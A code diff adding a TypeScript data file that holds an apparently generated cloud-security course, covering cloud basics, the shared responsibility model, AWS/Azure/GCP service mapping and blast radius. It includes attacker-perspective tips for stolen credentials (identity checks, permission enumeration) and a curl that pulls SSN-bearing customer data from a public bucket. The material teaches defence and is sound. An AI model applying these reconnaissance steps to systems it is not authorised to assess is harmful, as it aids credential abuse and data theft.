@@ -1,0 +1,14923 @@
+import type { Module } from "@/types"
+
+// Auto-generated full-depth Cloud Security curriculum.
+export const CLOUD_CURRICULUM: Module[] = [
+  {
+    "id": "cloud-m1",
+    "name": "Cloud Computing Fundamentals & the Shared Responsibility Model",
+    "shortName": "Cloud Fundamentals",
+    "month": 1,
+    "weeks": [
+      1
+    ],
+    "description": "Establishes the mental model for everything that follows: what the cloud actually is, how the big three providers (AWS, Azure, GCP) map onto the same primitives, and where the security line is drawn between provider and customer. Students learn to reason about blast radius, regions, and the control-plane vs data-plane split before touching any offensive or defensive tooling.",
+    "estimatedHours": 10,
+    "outcomes": [
+      "Explain the shared-responsibility model precisely for IaaS, PaaS, SaaS and serverless, and identify who owns a given control",
+      "Map equivalent core services across AWS, Azure and GCP (compute, storage, identity, networking)",
+      "Distinguish control plane from data plane and describe why most cloud breaches are control-plane (API) attacks",
+      "Reason about blast radius using accounts, subscriptions, projects, regions and availability zones"
+    ],
+    "topics": [
+      {
+        "id": "cloud-m1-1",
+        "moduleId": "cloud-m1",
+        "number": 1,
+        "title": "What the Cloud Really Is",
+        "type": "theory",
+        "week": 1,
+        "description": "Demystifies cloud computing as on-demand, API-driven, multi-tenant infrastructure. Frames every cloud resource as an object created, configured and destroyed through a control-plane API, which is the attack surface that matters.",
+        "keyPoints": [
+          "On-demand self-service, broad network access, resource pooling, elasticity, measured service (NIST SP 800-145)",
+          "IaaS vs PaaS vs SaaS vs FaaS/serverless and what each abstracts away",
+          "Control plane (management APIs, e.g. AWS API over HTTPS) vs data plane (the workload traffic)",
+          "Multi-tenancy and the hypervisor/isolation boundary as the provider's responsibility",
+          "Everything is an API call authenticated by signed credentials, not a login to a box"
+        ],
+        "slides": [
+          {
+            "title": "What the Cloud Really Is",
+            "body": "The 'cloud' is just someone else's computers that you rent on demand through an API. Instead of buying a server, racking it, and plugging in cables, you send a web request and a server appears seconds later. You pay only while you use it, and you destroy it with another request.\n\nAnalogy: owning servers is like owning a car — you buy it, park it, insure it, and maintain it whether you drive or not. The cloud is like a ride-hailing app: you summon exactly the vehicle you need, pay per trip, and it disappears when you are done. No garage, no maintenance crew, no idle capital.\n\nThe key mental shift for security: in the cloud there is no 'box' you log into. Every resource is an object you create, configure, and delete by calling a management API that is authenticated with signed credentials. Those API calls are the attack surface that matters most."
+          },
+          {
+            "title": "The Five Traits That Define Cloud (NIST SP 800-145)",
+            "body": "The US National Institute of Standards and Technology (NIST) nailed down five essential characteristics. If a service has all five, it is genuinely 'cloud':\n\n1. On-demand self-service — you provision resources yourself, no human on the other end.\n2. Broad network access — reachable over the network from standard clients.\n3. Resource pooling — the provider's hardware is shared ('multi-tenant') across many customers, sliced up dynamically.\n4. Rapid elasticity — capacity scales up and down fast, often automatically.\n5. Measured service — usage is metered, so you pay per second / per request / per gigabyte.\n\nWhy a security course cares: elasticity plus metering is exactly what makes 'denial-of-wallet' attacks possible — an attacker who can trigger scaling runs up your bill. Resource pooling is why tenant-isolation bugs are catastrophic.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Traditional Data Center",
+                  "points": [
+                    "Buy hardware up front (CapEx)",
+                    "Fixed capacity, slow to change",
+                    "You rack, cable, and power it",
+                    "Login to a physical/virtual box"
+                  ]
+                },
+                {
+                  "label": "Cloud (NIST 5 traits)",
+                  "points": [
+                    "Rent by the second (OpEx)",
+                    "Elastic, scales in seconds",
+                    "Provider owns the metal",
+                    "Call an API to create/destroy"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "The Service Models: IaaS, PaaS, SaaS, FaaS",
+            "body": "Cloud services differ by how much the provider manages for you. The more they manage, the less you control — and the less you are responsible for securing.\n\n- IaaS (Infrastructure as a Service): you rent raw virtual machines, disks, and networks. Example: AWS EC2. You still patch the OS.\n- PaaS (Platform as a Service): you deploy code to a managed runtime; the provider runs the OS and servers. Example: AWS Elastic Beanstalk, Azure App Service.\n- SaaS (Software as a Service): you just use finished software over the web. Example: Gmail, Salesforce. You manage only your data and user access.\n- FaaS / serverless (Function as a Service): you upload a single function; it runs on demand and scales to zero. Example: AWS Lambda, Azure Functions, Cloud Functions.\n\nRule of thumb: as you move IaaS → PaaS → SaaS → serverless, control and responsibility shift 'left' toward the provider. We will make that precise in the next topic.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "IaaS",
+                  "detail": "You manage OS, runtime, app, data (EC2)"
+                },
+                {
+                  "label": "PaaS",
+                  "detail": "Provider runs OS; you manage app + data"
+                },
+                {
+                  "label": "SaaS",
+                  "detail": "You manage only data + user access"
+                },
+                {
+                  "label": "FaaS",
+                  "detail": "You manage only the function code + data"
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Control Plane vs Data Plane",
+            "body": "Every cloud has two planes, and confusing them is a classic beginner mistake.\n\n- Control plane = the management APIs that create, configure, and delete resources. 'Make me a server', 'open this firewall', 'read this IAM policy'. In AWS this is the HTTPS API behind the CLI and console (e.g. ec2.amazonaws.com, s3.amazonaws.com).\n- Data plane = the actual workload traffic once a resource exists. A user hitting your web app, a query reaching your database, bytes flowing to an S3 object.\n\nMechanism, step by step:\n1. You (or a script) build an API request naming an action and resource.\n2. You sign it with credentials (AWS SigV4 signing, or a bearer token).\n3. The provider authenticates the signature, then authorizes it against policy.\n4. If allowed, the provider changes the resource and returns a result.\n\nWhy this matters: most serious cloud breaches are control-plane attacks. An attacker who steals credentials does not 'hack a server' — they simply call the API and ask it to hand over your data or make them an admin.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "attacker",
+                  "label": "Attacker with stolen creds",
+                  "highlighted": true
+                },
+                {
+                  "id": "cp",
+                  "label": "Control Plane API (ec2/s3/iam)",
+                  "highlighted": true
+                },
+                {
+                  "id": "res",
+                  "label": "Your resources (VMs, buckets, roles)"
+                },
+                {
+                  "id": "dp",
+                  "label": "Data Plane (app traffic, queries)"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "attacker",
+                  "to": "cp",
+                  "label": "signed API call"
+                },
+                {
+                  "from": "cp",
+                  "to": "res",
+                  "label": "create/modify/read"
+                },
+                {
+                  "from": "res",
+                  "to": "dp",
+                  "label": "serves"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: A Resource Is Just an API Call",
+            "body": "Watch a resource come into existence and then reveal who you are — all through signed API calls, no server login anywhere.\n\nThe first command creates an S3 bucket in one request. The second asks STS 'who am I?' and shows that your identity is a signed credential, not a username/password on a machine. If an attacker had those credentials, they could run the exact same commands.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3api create-bucket --bucket techni-demo-bkt --region ap-south-1 --create-bucket-configuration LocationConstraint=ap-south-1",
+                  "output": "{ \"Location\": \"http://techni-demo-bkt.s3.amazonaws.com/\" }"
+                },
+                {
+                  "command": "aws sts get-caller-identity",
+                  "output": "{\n  \"UserId\": \"AIDAEXAMPLE...\",\n  \"Account\": \"767196576843\",\n  \"Arn\": \"arn:aws:iam::767196576843:user/student\"\n}"
+                }
+              ]
+            },
+            "check": {
+              "question": "An attacker steals a developer's AWS access keys from a leaked .env file. With no other access, what can they most directly do?",
+              "options": [
+                "Nothing, because they cannot SSH into the EC2 instance",
+                "Call the AWS control-plane APIs as that identity (create/read/delete resources per its permissions)",
+                "Only read data-plane traffic passively on the network",
+                "Change the physical hardware the account runs on"
+              ],
+              "correctIndex": 1,
+              "explanation": "Cloud access is API-based. Valid signed credentials let the holder call the control plane as that principal — no server login required. What they can do is bounded only by that identity's IAM permissions, which is why leaked keys are so dangerous."
+            }
+          },
+          {
+            "title": "Multi-Tenancy and the Isolation Boundary",
+            "body": "Resource pooling means your virtual machine may share physical hardware with strangers. The provider keeps tenants apart using virtualization — a hypervisor slices one physical host into many isolated VMs, and newer offerings use lightweight micro-VMs (e.g. AWS Firecracker behind Lambda and Fargate).\n\nThat isolation boundary is the provider's responsibility. When it holds, your neighbor cannot read your memory or disk. When it breaks, the result is a 'cross-tenant' vulnerability — rare, high-severity, and usually fixed by the provider, not you.\n\nJargon unpacked:\n- Hypervisor: software that creates and runs virtual machines on shared hardware.\n- Noisy neighbor: a performance (not security) problem where another tenant hogs shared capacity.\n- Side-channel: an indirect leak (timing, cache) that can sometimes cross isolation (e.g. the 2018 Spectre/Meltdown CPU flaws).\n\nFor you, the practical takeaway: you do not defend the hypervisor, but you must assume your workload is one misconfiguration away from exposure and design accordingly."
+          },
+          {
+            "title": "How to Spot It: Follow the Credentials, Not the Ports",
+            "body": "To reason about a cloud system like a security engineer, stop looking for 'the server to hack' and start asking three questions:\n\n1. Which API endpoints exist? (e.g. s3.amazonaws.com, an API Gateway URL, the Kubernetes API server.)\n2. What credential authenticates each call? (Long-lived access key, temporary STS token, OIDC token, API key.)\n3. What is that credential allowed to do? (Its IAM / RBAC permissions = its blast radius.)\n\nHands-on reflex: the CLI command `aws sts get-caller-identity` is the cloud equivalent of `whoami`. Any time you land on credentials during an assessment, run it first to learn who you are. From there, enumerate what that identity can call. This 'who am I, what can I do' loop is the backbone of every cloud attack path you will study in this course."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "Understanding that the cloud is an API-driven, multi-tenant rental changes everything downstream:\n\n- The perimeter is identity, not the network. A firewall rule does not stop a stolen credential calling a public API endpoint.\n- Breaches are usually credential + permission problems, not memory-corruption exploits. The fix is least privilege and credential hygiene, which we build up over the next modules.\n- Elasticity and metering create new impact classes: denial-of-wallet (runaway cost) and resource abuse (crypto-mining in your account).\n- You share responsibility with the provider. Knowing exactly where their job ends and yours begins (the next topic) is the difference between 'secure by default' assumptions and real coverage.\n\nEverything in Cloud Security month 1 is a refinement of this one idea: in the cloud, security is mostly about controlling who can make which API call against which resource."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m1-2",
+        "moduleId": "cloud-m1",
+        "number": 2,
+        "title": "The Shared Responsibility Model",
+        "type": "theory",
+        "week": 1,
+        "description": "The single most important security concept in cloud. Walks through the AWS 'security OF the cloud vs security IN the cloud' line and how it shifts across service models, so students never assume the provider is covering a customer-owned control.",
+        "keyPoints": [
+          "Provider owns: physical, hypervisor, host OS, managed-service internals",
+          "Customer owns: IAM, data, network config, guest OS patching (for EC2), encryption choices",
+          "Responsibility shifts left as you move IaaS -> PaaS -> SaaS -> serverless",
+          "Shared controls: patch management, config, awareness & training",
+          "Common fatal assumption: 'S3 is managed so it's secure' — bucket policy and ACLs are the customer's job"
+        ],
+        "slides": [
+          {
+            "title": "The Shared Responsibility Model",
+            "body": "Security in the cloud is a partnership. The provider secures some layers; you secure the rest. The Shared Responsibility Model is the agreement that draws that line. AWS phrases it memorably:\n\n- The provider is responsible for security OF the cloud (the hardware, buildings, hypervisor, managed-service internals).\n- You are responsible for security IN the cloud (your data, identities, configurations, and access rules).\n\nAnalogy: renting an apartment. The landlord secures the building structure, the foundation, and the main entrance locks. But you are responsible for locking your own apartment door, deciding who gets a key, and not leaving valuables on the balcony. If you prop your door open, that is not the landlord's fault.\n\nThis is the single most important concept in cloud security. Almost every real-world cloud breach is a customer-side failure — a control the customer owned but assumed the provider was handling."
+          },
+          {
+            "title": "Who Owns What",
+            "body": "Here is the division of labor for a typical IaaS deployment (e.g. running EC2):\n\nProvider owns ('of the cloud'):\n- Physical data centers, power, cooling, physical access control\n- Server hardware and the hypervisor / virtualization layer\n- The host operating system the hypervisor runs on\n- The internal implementation of managed services (e.g. S3's storage fabric)\n\nCustomer owns ('in the cloud'):\n- IAM: users, roles, policies — who can do what\n- Data: classification, encryption choices, where it lives\n- Network configuration: security groups, subnets, public exposure\n- Guest OS: patching, hardening, and software on your EC2 instances\n- Application code and its vulnerabilities\n\nShared controls (both play a part): patch management, configuration management, and awareness/training. The provider patches the hypervisor; you patch your VM's OS.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Provider: security OF the cloud",
+                  "points": [
+                    "Physical facilities & hardware",
+                    "Hypervisor / virtualization",
+                    "Host OS",
+                    "Managed-service internals"
+                  ]
+                },
+                {
+                  "label": "Customer: security IN the cloud",
+                  "points": [
+                    "IAM, users, roles, policies",
+                    "Your data + encryption choices",
+                    "Network config (security groups)",
+                    "Guest OS patching, app code"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: The Line Shifts With the Service Model",
+            "body": "The responsibility line is not fixed — it moves depending on how managed the service is. The more the provider runs, the less you own.\n\n- IaaS (EC2): you own the guest OS, patching, runtime, app, data, IAM, network. Largest customer surface.\n- PaaS (App Service / Elastic Beanstalk): the provider runs the OS and runtime; you own the app, data, IAM, and config.\n- SaaS (Microsoft 365, Salesforce): the provider runs almost everything; you own only your data and user access/permissions.\n- Serverless (Lambda): the provider runs the OS and scaling; you own the function code, its IAM role, and data.\n\nNotice what never leaves your side regardless of model: identity and access management, and your data. No matter how 'managed' a service is, you always decide who can reach it and how it is configured.",
+            "diagram": {
+              "type": "flow-chain",
+              "steps": [
+                {
+                  "label": "IaaS",
+                  "detail": "You own OS+runtime+app+data+IAM+net"
+                },
+                {
+                  "label": "PaaS",
+                  "detail": "Provider owns OS+runtime; you own app+data+IAM"
+                },
+                {
+                  "label": "SaaS",
+                  "detail": "You own only data + user access"
+                },
+                {
+                  "label": "Serverless",
+                  "detail": "You own function code + IAM role + data"
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: The S3 Bucket That Everyone Gets Wrong",
+            "body": "The classic fatal assumption: 'S3 is a managed service, so AWS keeps my data secure.' AWS keeps the storage fabric secure and durable. Whether your bucket is readable by the whole internet is 100% your configuration — your job.\n\nBelow, a bucket policy grants `s3:GetObject` to Principal `*` (everyone). AWS will happily serve those objects to anonymous users worldwide, exactly as configured. The platform is working as designed; the customer made it public. This single pattern is behind a huge share of 'data leak' headlines (voter records, resumes, medical images).",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3api get-bucket-policy --bucket acme-customer-data --query Policy --output text",
+                  "output": "{\n  \"Statement\": [{\n    \"Effect\": \"Allow\",\n    \"Principal\": \"*\",\n    \"Action\": \"s3:GetObject\",\n    \"Resource\": \"arn:aws:s3:::acme-customer-data/*\"\n  }]\n}"
+                },
+                {
+                  "command": "curl -s https://acme-customer-data.s3.amazonaws.com/exports/customers.csv | head -1",
+                  "output": "id,name,email,ssn   <-- served to anyone, no credentials"
+                }
+              ]
+            },
+            "check": {
+              "question": "A company's S3 bucket is publicly readable and customer data leaks. Under the shared responsibility model, whose failure is this?",
+              "options": [
+                "AWS's — they manage S3 so they must secure its contents",
+                "The customer's — bucket policy, ACLs, and Block Public Access are customer-owned configuration",
+                "Nobody's — public buckets are a known accepted risk",
+                "Shared equally between AWS and the customer"
+              ],
+              "correctIndex": 1,
+              "explanation": "AWS secures the S3 service itself (durability, the storage fabric). Access configuration — bucket policy, ACLs, and the Block Public Access setting — is squarely the customer's responsibility. A public-data leak is a customer-side misconfiguration."
+            }
+          },
+          {
+            "title": "Nuance: Managed Services Blur the Line (But Never Erase IAM)",
+            "body": "Managed and serverless services move a lot off your plate, which is great — but two subtleties trip people up:\n\n1. You still own the service's configuration and access. With Amazon RDS (managed database), AWS patches the database engine and the OS under it. You still choose whether it is publicly accessible, whether it is encrypted, and which IAM principals and security groups can reach it.\n\n2. 'Managed' is about operations, not safety. A managed service with a wide-open security group or an over-permissive resource policy is just as exposed as a self-run one. The provider will not stop you from configuring it insecurely.\n\nAcross every model, two responsibilities are permanently yours: identity/access (who can touch it) and data governance (what it is, where it lives, how it is protected). When in doubt, assume a control is yours until the provider's documentation explicitly says otherwise."
+          },
+          {
+            "title": "How to Test It: Build a Responsibility Matrix",
+            "body": "Do not guess where the line is — write it down. For any service you deploy, build a small responsibility matrix listing each control and marking it Provider / Customer / Shared. This is a standard deliverable in cloud security reviews.\n\nPractical workflow:\n1. List the service's controls: physical, host OS, guest OS, network, IAM, data encryption, backups, logging.\n2. For each, consult the provider's shared-responsibility documentation and mark the owner.\n3. For every 'Customer' and 'Shared' row, ask: is there an actual control in place, or did we assume the provider had it?\n4. The gaps — customer-owned controls nobody configured — are your findings.\n\nDuring an assessment, this matrix is how you avoid the two failure modes: testing things the provider owns (waste of time, out of scope) and ignoring things you own (missed risk)."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "The shared responsibility model is the lens for the entire course:\n\n- It tells you what is in scope. You test customer-owned controls: IAM, bucket policies, security groups, secrets, app logic — not the hypervisor.\n- It explains the breach statistics. Industry data consistently shows the overwhelming majority of cloud security failures are customer-side misconfigurations, not provider compromises. The model predicts exactly that.\n- It kills dangerous assumptions. 'It is managed, so it is secure' is the sentence behind countless incidents. Managed means operated, not automatically safe.\n- It scales across providers. AWS, Azure, and GCP all publish their own versions; the principle is identical even when the diagrams differ.\n\nInternalize the division now: provider secures the cloud, you secure what you put in it — above all, identity and data. Everything else in cloud security is detail on top of this."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m1-3",
+        "moduleId": "cloud-m1",
+        "number": 3,
+        "title": "Cross-Provider Service Mapping",
+        "type": "theory",
+        "week": 1,
+        "description": "Builds a Rosetta Stone across AWS, Azure and GCP so knowledge transfers. Compute, storage, identity, networking and serverless primitives line up even when names differ.",
+        "keyPoints": [
+          "Compute: EC2 / Azure VM / GCE; Lambda / Azure Functions / Cloud Functions",
+          "Storage: S3 / Azure Blob / GCS; EBS / Managed Disk / Persistent Disk",
+          "Identity: IAM / Entra ID (Azure AD) / Cloud IAM; roles vs service principals vs service accounts",
+          "Networking: VPC / VNet / VPC; Security Group / NSG / Firewall rule",
+          "Org hierarchy: AWS Organizations+accounts / Management Groups+subscriptions / Org+folders+projects"
+        ],
+        "slides": [
+          {
+            "title": "Cross-Provider Service Mapping",
+            "body": "AWS, Azure, and GCP look like three different languages, but they describe the same primitives. Learn the concepts once and you can read any of them. This 'Rosetta Stone' is what lets a finding on AWS translate instantly to Azure or GCP.\n\nAnalogy: a car is a car whether you buy it in the US, UK, or Japan. The steering wheel might be on the other side and the brand names differ, but 'engine', 'brakes', and 'fuel tank' map one-to-one. Cloud is the same: every provider has compute, storage, identity, and networking — they just brand them differently.\n\nThe five pillars that map across all three:\n1. Compute (run code)\n2. Storage (hold data)\n3. Identity (who can act)\n4. Networking (how things connect and who is reachable)\n5. Organization hierarchy (how accounts are grouped and governed)"
+          },
+          {
+            "title": "Compute and Storage Across the Big Three",
+            "body": "Compute — running your code:\n- Virtual machines: AWS EC2 = Azure Virtual Machines = GCP Compute Engine (GCE).\n- Serverless functions: AWS Lambda = Azure Functions = GCP Cloud Functions.\n- Containers: AWS ECS/EKS = Azure AKS = GCP GKE (all Kubernetes-based for the 'K' variants).\n\nStorage — holding data:\n- Object storage (files via API, the S3 model): AWS S3 = Azure Blob Storage = GCP Cloud Storage (GCS).\n- Block storage (virtual disks attached to VMs): AWS EBS = Azure Managed Disks = GCP Persistent Disk.\n\nWhy this matters for security: object storage is the #1 source of public-data leaks on every provider. The 'public S3 bucket' problem is identical to a 'public Azure blob container' and a 'public GCS bucket' — same mistake, three names.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "EC2 (VMs)",
+                    "Lambda (functions)",
+                    "S3 (objects)",
+                    "EBS (disks)"
+                  ]
+                },
+                {
+                  "label": "Azure",
+                  "points": [
+                    "Virtual Machines",
+                    "Azure Functions",
+                    "Blob Storage",
+                    "Managed Disks"
+                  ]
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "Compute Engine",
+                    "Cloud Functions",
+                    "Cloud Storage",
+                    "Persistent Disk"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Identity: The Same Idea, Three Vocabularies",
+            "body": "Identity is where the names diverge most, but the model is shared: a principal (human or workload) is granted permissions to act on resources.\n\n- AWS IAM: users and roles. A role is assumed to get temporary credentials. Workloads use roles via instance profiles.\n- Azure: Microsoft Entra ID (formerly Azure AD) for identities; role assignments via Azure RBAC. Workloads use service principals and managed identities.\n- GCP: Cloud IAM; human identities in Google Workspace / Cloud Identity; workloads use service accounts.\n\nThe key cross-provider concept is the machine/workload identity:\n- AWS role (assumed) ≈ Azure service principal / managed identity ≈ GCP service account.\n\nSecurity relevance: workload identities are the most common privilege-escalation pivot on every cloud. An attacker who reaches a VM tries to grab its attached role/managed identity/service account and inherit its permissions. Same attack, three names.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "IAM users",
+                    "IAM roles (assumed, STS)",
+                    "Instance profile on EC2"
+                  ]
+                },
+                {
+                  "label": "Azure",
+                  "points": [
+                    "Entra ID (Azure AD)",
+                    "Service principals",
+                    "Managed identities"
+                  ]
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "Cloud IAM",
+                    "Service accounts",
+                    "SA attached to VM"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Networking and the Org Hierarchy",
+            "body": "Networking — isolating and connecting resources:\n- Private network: AWS VPC = Azure VNet = GCP VPC. A software-defined private network you carve into subnets.\n- Firewall at the resource level: AWS Security Group = Azure Network Security Group (NSG) = GCP Firewall rule. Stateful allow-lists controlling inbound/outbound traffic.\n\nOrganization hierarchy — grouping and governing accounts:\n- AWS: Organizations contain Accounts, grouped into Organizational Units (OUs), governed by Service Control Policies (SCPs).\n- Azure: Management Groups contain Subscriptions, which contain Resource Groups, governed by Azure Policy.\n- GCP: Organization contains Folders, which contain Projects, governed by Org Policies.\n\nThe rough tier mapping for 'the unit of isolation and billing':\n- AWS Account ≈ Azure Subscription ≈ GCP Project.\n\nKnowing this lets you reason about blast radius (next topic) on any provider: the account/subscription/project is the primary containment unit.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "AWS",
+                  "points": [
+                    "VPC / Subnet",
+                    "Security Group",
+                    "Organizations → OU → Account",
+                    "SCPs govern"
+                  ]
+                },
+                {
+                  "label": "Azure",
+                  "points": [
+                    "VNet / Subnet",
+                    "NSG",
+                    "Mgmt Group → Subscription → RG",
+                    "Azure Policy"
+                  ]
+                },
+                {
+                  "label": "GCP",
+                  "points": [
+                    "VPC / Subnet",
+                    "Firewall rule",
+                    "Org → Folder → Project",
+                    "Org Policies"
+                  ],
+                  "highlighted": true
+                }
+              ]
+            }
+          },
+          {
+            "title": "Worked Example: 'List My Buckets' on All Three",
+            "body": "The concept 'list my object-storage containers' is one command on each provider. Same intent, three CLIs. Learning to see past the syntax is the whole point of the Rosetta Stone.\n\nNotice the identity-check pattern repeats too: each provider has a 'who am I' call, which is always your first move after obtaining credentials on an unfamiliar platform.",
+            "diagram": {
+              "type": "terminal",
+              "prompt": "$",
+              "lines": [
+                {
+                  "command": "aws s3 ls",
+                  "output": "2026-02-01 10:04:11 acme-prod-assets        # AWS: object storage = S3"
+                },
+                {
+                  "command": "az storage container list --account-name acmeprod -o table",
+                  "output": "Name            Public Access   # Azure: object storage = Blob containers"
+                },
+                {
+                  "command": "gcloud storage ls",
+                  "output": "gs://acme-prod-assets/          # GCP: object storage = Cloud Storage buckets"
+                },
+                {
+                  "command": "aws sts get-caller-identity   # vs   az account show   # vs   gcloud auth list",
+                  "output": "each provider has its own 'who am I' — run it first"
+                }
+              ]
+            },
+            "check": {
+              "question": "You know how to exploit an over-permissioned AWS IAM role attached to an EC2 instance. What is the closest Azure equivalent you would look for?",
+              "options": [
+                "An Azure Blob container with public access",
+                "A managed identity (or service principal) assigned to a Virtual Machine",
+                "A Network Security Group allowing port 22",
+                "A Management Group with no Azure Policy"
+              ],
+              "correctIndex": 1,
+              "explanation": "An AWS role attached to a VM maps to an Azure managed identity (or service principal) assigned to a VM — both are workload identities an attacker on the VM can abuse to inherit cloud permissions. The concept transfers; only the name changes."
+            }
+          },
+          {
+            "title": "Nuance: Where the Mapping Leaks",
+            "body": "The Rosetta Stone is powerful but not perfect. A few places where providers genuinely differ — and where assuming equivalence causes mistakes:\n\n- Default public exposure differs. The defaults and guardrails for making storage public are not identical across S3, Blob, and GCS, and they change over time. Always verify the live setting, never assume.\n- IAM granularity differs. AWS policy evaluation, Azure RBAC role assignments, and GCP IAM bindings have different precedence rules and condition systems. A clean AWS mental model will mislead you on Azure RBAC inheritance.\n- Org tiers are not exactly 1:1. GCP has Folders between Org and Project; Azure has Resource Groups below Subscription with no exact AWS twin. The mapping is 'close enough to orient', not 'identical'.\n- Managed-identity mechanics differ. GCP service accounts can be impersonated; AWS roles are assumed; Azure managed identities are system- or user-assigned. The exploitation steps differ in detail.\n\nUse the mapping to orient fast, then read the specific provider's docs before you act."
+          },
+          {
+            "title": "Why It Matters",
+            "body": "A portable mental model is a career multiplier and an assessment accelerator:\n\n- Skills transfer. Most organizations are multi-cloud or will be. Understanding the shared primitives means you are never starting from zero on a new provider.\n- Findings translate. A 'public object storage' or 'over-permissioned workload identity' finding is the same risk class everywhere; you can reuse your methodology and reporting language.\n- Frameworks are provider-agnostic. The CIS Benchmarks publish separate guides for AWS, Azure, and GCP, but the control categories (identity, logging, network, storage) line up with these same pillars.\n- It focuses your learning. Instead of memorizing hundreds of service names, you learn five concepts (compute, storage, identity, network, hierarchy) and slot each new service into one.\n\nFor the rest of this course we lead with AWS for concreteness, but every attack path and defense you learn maps onto Azure and GCP via this table."
+          }
+        ]
+      },
+      {
+        "id": "cloud-m1-4",
+        "moduleId": "cloud-m1",
+        "number": 4,
+        "title": "Accounts, Regions, Blast Radius",
+        "type": "theory",
+        "week": 1,
+        "description": "Covers the isolation and segmentation units of the cloud and how they bound an incident. Students learn why multi-account/multi-project architectures limit damage and how region selection affects data residency.",
+        "keyPoints": [
+          "AWS account = hard security boundary; Organizations + OUs + SCPs for guardrails",
+          "Regions and Availability Zones; data residency and sovereignty implications",
+          "Global vs regional services (IAM & Route53 are global; EC2 & S3 buckets are regional)",
+          "Blast radius reduction via account-per-environment / per-team segmentation",
+          "Landing zones and AWS Control Tower as the governed starting point"
+        ],
+        "slides": [
+          {
+            "title": "Accounts, Regions, Blast Radius",
+            "body": "'Blast radius' is how much damage a single compromise can do before it is contained. Cloud gives you boundaries to shrink it — and choosing them well is architecture-level defense.\n\nAnalogy: a ship is built with watertight compartments. If the hull is breached, sealing the bulkheads keeps the flooding to one section instead of sinking the whole vessel. In the cloud, accounts, subscriptions, and projects are your bulkheads. Put everything in one and a single leak sinks the ship; split it up and a breach is contained to one compartment.\n\nThe two concepts in this topic:\n1. Isolation units — accounts/subscriptions/projects, and how strongly they separate things.\n2. Geographic units — regions and availability zones, which affect resilience and data residency.\n\nGetting these right is the cheapest, most durable security control you have: it is structural, so it keeps working even when individual controls fail."
+          },
+          {
+            "title": "The AWS Account as a Hard Boundary",
+            "body": "In AWS, the account is the strongest isolation boundary available. By default, resources and identities in one account cannot touch another account's resources at all. Cross-account access only exists where you deliberately grant it (via role trust or resource policies).\n\nMechanism:\n- An IAM role, user, or resource lives inside exactly one account.\n- To reach account B from account A, account B must explicitly trust an account-A principal. No implicit access exists.\n- This makes the account a natural containment unit: compromise of a dev account should not reach production if they are separate accounts.\n\nTo manage many accounts, AWS Organizations groups them into a tree of Organizational Units (OUs). Service Control Policies (SCPs) attach to OUs/accounts as org-wide guardrails. Crucially, SCPs can only restrict — they set the maximum possible permissions; they never grant anything. We will see SCPs again in the IAM module.",
+            "diagram": {
+              "type": "graph-tree",
+              "nodes": [
+                {
+                  "id": "org",
+                  "label": "AWS Organization (root)"
+                },
+                {
+                  "id": "ou1",
+                  "label": "OU: Production",
+                  "highlighted": true
+                },
+                {
+                  "id": "ou2",
+                  "label": "OU: Development"
+                },
+                {
+                  "id": "prod",
+                  "label": "Account: prod-payments",
+                  "highlighted": true
+                },
+                {
+                  "id": "dev",
+                  "label": "Account: dev-sandbox"
+                }
+              ],
+              "edges": [
+                {
+                  "from": "org",
+                  "to": "ou1",
+                  "label": "SCP guardrail"
+                },
+                {
+                  "from": "org",
+                  "to": "ou2",
+                  "label": "SCP guardrail"
+                },
+                {
+                  "from": "ou1",
+                  "to": "prod",
+                  "label": ""
+                },
+                {
+                  "from": "ou2",
+                  "to": "dev",
+                  "label": ""
+                }
+              ]
+            }
+          },
+          {
+            "title": "Regions, Availability Zones, and Data Residency",
+            "body": "A region is a geographic location (e.g. ap-south-1 = Mumbai, us-east-1 = N. Virginia) containing multiple isolated data centers. Each isolated data center group is an Availability Zone (AZ). Regions give you two things:\n\n1. Resilience: spreading workloads across AZs survives a single data-center failure; spreading across regions survives a regional outage.\n2. Data residency / sovereignty: the region determines which country's laws and jurisdiction govern your data. Storing EU personal data in an EU region is often a legal requirement (GDPR). Choosing the wrong region can be a compliance violation even with perfect technical security.\n\nSecurity nuance you must know: regions are isolated for workloads, but some services are global, not regional. On AWS, IAM and Route 53 (DNS) are global — an IAM change applies everywhere at once. Most services (EC2, S3 buckets, RDS) are regional — a bucket lives in one region. This matters for both blast radius and for where you must look during an assessment.",
+            "diagram": {
+              "type": "comparison",
+              "columns": [
+                {
+                  "label": "Global services (one scope worldwide)",
+                  "points": [
+                    "IAM (identities & policies)",
+                    "Route 53 (DNS)",
+                    "CloudFront (CDN edge)",
+                    "A change applies everywhere at once"
+                  ],
+                  "highlighted": true
+                },
+                {
+                  "label": "Regional services (per-region)",
+                  "points": [
+                    "EC2 instances",
+                    "S3 buckets (in one region)",
+                    "RDS databases",
+                    "Must enumerate region by region"
+                  ]
+                }
+              ]
+            }
+          },
+          {
+            "title": "How It Works: Segmentation Shrinks Blast Radius",
